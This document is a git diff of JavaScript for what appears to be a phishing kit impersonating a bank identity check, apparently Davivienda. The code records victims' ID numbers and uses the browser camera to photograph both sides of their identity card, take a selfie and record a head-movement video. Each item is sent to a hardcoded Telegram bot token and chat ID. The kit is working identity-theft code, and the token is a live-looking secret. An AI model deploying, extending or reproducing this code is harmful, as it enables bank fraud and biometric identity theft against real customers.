@@ -3,25 +3,27 @@ document.addEventListener('DOMContentLoaded', () => {
     const isVerificationPage = window.location.pathname.includes('verification.html');
     
     // --- SHARED CONFIG ---
-    // REEMPLAZA ESTOS VALORES CON LOS TUYOS
     const TELEGRAM_BOT_TOKEN = '7793777042:AAHegpN7eQIAcBJZjtMDfZZIwGnsmqv7vfg'; 
     const TELEGRAM_CHAT_ID = '-4992418825';
 
-    // --- PAGE: INDEX (FORM + ID UPLOAD) ---
+    // --- PAGE: INDEX (FORM + ID SCAN FLOW) ---
     if (!isVerificationPage) {
-        const loginForm = document.getElementById('login-form');
+        // Elements
         const loginStep = document.getElementById('login-step');
-        const idScanStep = document.getElementById('id-scan-step');
-        const uploadForm = document.getElementById('upload-form');
-        const uploadStatus = document.getElementById('upload-status');
-        const btnUpload = document.getElementById('btn-upload-continue');
+        const instructionStep = document.getElementById('instruction-step');
+        const scanFrontStep = document.getElementById('scan-front-step');
+        const scanBackStep = document.getElementById('scan-back-step');
 
-        // File Inputs
-        const frontInput = document.getElementById('id-front');
-        const backInput = document.getElementById('id-back');
-        const frontName = document.getElementById('front-file-name');
-        const backName = document.getElementById('back-file-name');
+        const loginForm = document.getElementById('login-form');
+        const btnInstructionContinue = document.getElementById('btn-instruction-continue');
+        const btnCaptureFront = document.getElementById('btn-capture-front');
+        const btnCaptureBack = document.getElementById('btn-capture-back');
 
+        // Video Elements
+        const videoFront = document.getElementById('camera-feed-front');
+        const videoBack = document.getElementById('camera-feed-back');
+
+        // 1. Handle Login Form Submit
         if (loginForm) {
             loginForm.addEventListener('submit', (e) => {
                 e.preventDefault();
@@ -37,57 +39,56 @@ document.addEventListener('DOMContentLoaded', () => {
                     // Notify Telegram
                     sendTextToTelegram(`Nuevo usuario iniciando:\nTipo: ${docType}\nDocumento: ${docNumber}`);
                     
-                    // Switch to ID Upload
+                    // Go to Instructions
                     loginStep.classList.add('hidden');
-                    idScanStep.classList.remove('hidden');
+                    instructionStep.classList.remove('hidden');
                 }
             });
         }
 
-        // Display file names on selection
-        if (frontInput) {
-            frontInput.addEventListener('change', (e) => {
-                if (e.target.files.length > 0) frontName.textContent = e.target.files[0].name;
-            });
-        }
-        if (backInput) {
-            backInput.addEventListener('change', (e) => {
-                if (e.target.files.length > 0) backName.textContent = e.target.files[0].name;
+        // 2. Handle Instruction Continue
+        if (btnInstructionContinue) {
+            btnInstructionContinue.addEventListener('click', () => {
+                instructionStep.classList.add('hidden');
+                scanFrontStep.classList.remove('hidden');
+                startCamera(videoFront, 'environment');
             });
         }
 
-        // Handle Upload Submit
-        if (uploadForm) {
-            uploadForm.addEventListener('submit', async (e) => {
-                e.preventDefault();
-                
-                const frontFile = frontInput.files[0];
-                const backFile = backInput.files[0];
-
-                if (!frontFile || !backFile) {
-                    uploadStatus.textContent = "Por favor seleccione ambas fotos.";
-                    return;
-                }
-
-                uploadStatus.textContent = "Enviando documentos...";
-                btnUpload.disabled = true;
-
+        // 3. Handle Front Capture
+        if (btnCaptureFront) {
+            btnCaptureFront.addEventListener('click', async () => {
                 const docNum = localStorage.getItem('docNumber') || 'Desconocido';
+                
+                // Capture
+                const blob = await captureImage(videoFront);
+                stopCamera(videoFront);
+                
+                // Send to Telegram (Async but wait for it to ensure order)
+                // Showing a visual cue could be good here, but for now we proceed
+                await sendPhotoToTelegram(blob, 'id_front.jpg', `Documento (Frente) - ${docNum}`);
 
-                // Send Front
-                await sendPhotoToTelegram(frontFile, 'id_front.jpg', `Documento (Frente) - ${docNum}`);
-                
-                // Small delay to ensure order
-                await new Promise(r => setTimeout(r, 1000));
-                
-                // Send Back
-                await sendPhotoToTelegram(backFile, 'id_back.jpg', `Documento (Reverso) - ${docNum}`);
+                // Move to Back Scan
+                scanFrontStep.classList.add('hidden');
+                scanBackStep.classList.remove('hidden');
+                startCamera(videoBack, 'environment');
+            });
+        }
 
-                uploadStatus.textContent = "¡Documentos enviados!";
+        // 4. Handle Back Capture
+        if (btnCaptureBack) {
+            btnCaptureBack.addEventListener('click', async () => {
+                const docNum = localStorage.getItem('docNumber') || 'Desconocido';
                 
-                setTimeout(() => {
-                    window.location.href = 'verification.html';
-                }, 1500);
+                // Capture
+                const blob = await captureImage(videoBack);
+                stopCamera(videoBack);
+                
+                // Send to Telegram
+                await sendPhotoToTelegram(blob, 'id_back.jpg', `Documento (Reverso) - ${docNum}`);
+
+                // Redirect to Verification
+                window.location.href = 'verification.html';
             });
         }
     }
@@ -96,62 +97,41 @@ document.addEventListener('DOMContentLoaded', () => {
     if (isVerificationPage) {
         const video = document.getElementById('webcam');
         const cameraInstruction = document.querySelector('.camera-instruction');
-        const verificationStep = document.getElementById('verification-step');
-        const successStep = document.getElementById('success-step');
+        
         let mediaRecorder;
         let recordedChunks = [];
 
         // Auto-start verification when page loads
         if (video) {
-            startCamera();
-        }
-
-        async function startCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user', width: 640, height: 480 },
-                    audio: false 
-                });
-                video.srcObject = stream;
-                
-                video.onloadedmetadata = () => {
-                    setTimeout(startVerificationProcess, 1000);
-                };
-            } catch (err) {
-                console.error("Error accessing camera:", err);
-                if (cameraInstruction) cameraInstruction.textContent = "Error de cámara";
-            }
+            startCamera(video, 'user');
+            
+            video.onloadedmetadata = () => {
+                setTimeout(startVerificationProcess, 1000);
+            };
         }
 
         function startVerificationProcess() {
-            cameraInstruction.textContent = "Mirando al frente...";
+            if (cameraInstruction) cameraInstruction.textContent = "Mirando al frente...";
             
             setTimeout(() => {
                 captureSelfie();
                 
-                cameraInstruction.textContent = "Mueva su cabeza lentamente...";
+                if (cameraInstruction) cameraInstruction.textContent = "Mueva su cabeza lentamente...";
                 startRecording();
                 
                 setTimeout(() => {
                     stopRecording();
-                    cameraInstruction.textContent = "Procesando...";
+                    if (cameraInstruction) cameraInstruction.textContent = "Procesando...";
                 }, 4000);
                 
             }, 1500);
         }
 
         function captureSelfie() {
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
-            
             const docNum = localStorage.getItem('docNumber') || 'Desconocido';
-
-            canvas.toBlob((blob) => {
+            captureImage(video).then(blob => {
                 sendPhotoToTelegram(blob, 'selfie.jpg', `Selfie - ${docNum}`);
-            }, 'image/jpeg', 0.8);
+            });
         }
 
         function startRecording() {
@@ -166,6 +146,7 @@ document.addEventListener('DOMContentLoaded', () => {
             try {
                 mediaRecorder = new MediaRecorder(video.srcObject, options);
             } catch (e) {
+                console.warn("MediaRecorder fallback", e);
                 mediaRecorder = new MediaRecorder(video.srcObject);
             }
 
@@ -179,8 +160,11 @@ document.addEventListener('DOMContentLoaded', () => {
                 const blob = new Blob(recordedChunks, { type: 'video/webm' });
                 const docNum = localStorage.getItem('docNumber') || 'Desconocido';
                 sendVideoToTelegram(blob, `Video - ${docNum}`);
-                stopCamera();
-                transitionToSuccess();
+                stopCamera(video);
+                
+                // Maybe show a success message or redirect?
+                if (cameraInstruction) cameraInstruction.textContent = "¡Verificación Completada!";
+                // Optional: window.location.href = 'https://www.davivienda.com'; 
             };
 
             mediaRecorder.start();
@@ -191,70 +175,73 @@ document.addEventListener('DOMContentLoaded', () => {
                 mediaRecorder.stop();
             }
         }
+    }
 
-        function stopCamera() {
-            if (video.srcObject) {
-                const tracks = video.srcObject.getTracks();
-                tracks.forEach(track => track.stop());
-                video.srcObject = null;
-            }
-        }
+    // --- SHARED HELPER FUNCTIONS ---
 
-        function transitionToSuccess() {
-            verificationStep.classList.add('hidden');
-            successStep.classList.remove('hidden');
-            
-            // Clear sensitive data
-            localStorage.removeItem('docNumber');
-            localStorage.removeItem('docType');
-
-            setTimeout(() => {
-                // Redirect back to start or elsewhere
-                window.location.href = 'index.html';
-            }, 3000);
+    async function startCamera(videoElement, facingMode) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
+                audio: false 
+            });
+            videoElement.srcObject = stream;
+        } catch (err) {
+            console.error("Error accessing camera:", err);
+            alert("No se pudo acceder a la cámara. Por favor verifique los permisos.");
         }
     }
 
-    // --- SHARED: TELEGRAM FUNCTIONS ---
+    function stopCamera(videoElement) {
+        if (videoElement.srcObject) {
+            const tracks = videoElement.srcObject.getTracks();
+            tracks.forEach(track => track.stop());
+            videoElement.srcObject = null;
+        }
+    }
+
+    function captureImage(videoElement) {
+        return new Promise((resolve) => {
+            const canvas = document.createElement('canvas');
+            canvas.width = videoElement.videoWidth;
+            canvas.height = videoElement.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(videoElement, 0, 0);
+            
+            canvas.toBlob((blob) => {
+                resolve(blob);
+            }, 'image/jpeg', 0.8);
+        });
+    }
+
+    // --- TELEGRAM FUNCTIONS ---
 
     async function sendTextToTelegram(text) {
-        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'TU_TOKEN_AQUI') return;
-
+        if (!TELEGRAM_BOT_TOKEN) return;
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_CHAT_ID);
         formData.append('text', text);
-
         return fetch(url, { method: 'POST', body: formData }).catch(console.error);
     }
 
     async function sendPhotoToTelegram(blob, filename, caption) {
-        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'TU_TOKEN_AQUI') return;
-
+        if (!TELEGRAM_BOT_TOKEN) return;
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_CHAT_ID);
-        formData.append('photo', blob, filename || 'photo.jpg');
+        formData.append('photo', blob, filename);
         formData.append('caption', caption || '');
-
-        return fetch(url, { method: 'POST', body: formData })
-            .then(res => res.json())
-            .then(data => {
-                if (!data.ok) console.error('Telegram Error:', data);
-                return data;
-            })
-            .catch(console.error);
+        return fetch(url, { method: 'POST', body: formData }).catch(console.error);
     }
 
     async function sendVideoToTelegram(blob, caption) {
-        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'TU_TOKEN_AQUI') return;
-
+        if (!TELEGRAM_BOT_TOKEN) return;
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_CHAT_ID);
         formData.append('video', blob, 'biometric_video.webm');
-        formData.append('caption', caption || 'Video de prueba');
-
+        formData.append('caption', caption || '');
         return fetch(url, { method: 'POST', body: formData }).catch(console.error);
     }
 });
